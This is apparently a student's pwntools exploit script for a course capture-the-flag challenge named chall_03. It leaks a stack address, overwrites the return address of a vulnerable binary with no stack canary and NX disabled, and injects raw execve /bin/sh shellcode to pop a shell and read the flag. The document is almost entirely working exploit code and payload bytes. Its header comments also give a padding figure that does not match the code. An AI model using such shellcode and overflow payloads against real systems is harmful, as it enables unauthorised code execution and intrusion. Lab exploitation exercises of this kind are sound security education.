'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     Project 2 --- chall_03
File Description:  Basic shell code injection, considering input from user

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   68) Symbols       No    0               2               chall_03

File info:
chall_03: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ea403916cf23cae02153abfc5de62994dcdb28b0, for GNU/Linux 3.2.0, not stripped

Radare2:
afl --> list all functions

Need to use leak to find address where I can input shellcode
Padding to ebp is 140h --> 320 in decimal + 4 for ebp

Generate shellcode Commands
context.arch="amd64"
asm(shellcraft.sh())
print(len(shellcraft.sh()))
'''

# Import libraries
from pwn import *

p=process("./chall_03")     # Create Process
resp=p.recvuntil(b":) ")
leak=p.recvuntil(b"\n")
print(resp)
print(leak)

# Payload crafting
intleak = int(leak,16)  #random address created from pie
leakaddr = p64(intleak) # executable is 64 bit so
shell =b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05' #pop a shell, length 48, print(len(asm(shellcraft.sh())))
filler = b'a'*280   # 48 (shell) + 272 (empty buff) + 8 (rbp)
payload=shell+filler+leakaddr

# Send line to it then see if interactive
p.sendline(payload)#for nice unprintable payloads
p.interactive()
#if you have a shell then you can now type `ls` and `cat flag`